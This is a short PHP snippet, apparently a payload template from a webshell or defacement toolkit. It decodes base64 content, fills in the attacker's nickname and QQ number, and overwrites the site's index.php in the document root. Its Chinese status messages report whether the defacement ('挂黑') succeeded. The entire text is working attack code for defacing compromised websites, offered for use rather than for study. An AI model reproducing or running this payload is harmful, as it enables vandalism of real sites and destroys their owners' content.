$nick = '{h_nick}';
$qq = '{h_qq}';
$content = str_replace('{name}',$nick,str_replace('{qq}',$qq,base64_decode('{content}')));
if(file_put_contents($_SERVER['DOCUMENT_ROOT'].'/index.php', $content)){
	echo '<moleft>挂黑成功</moleft>';
}
else{
	echo '<moleft>挂黑失败</moleft>';
}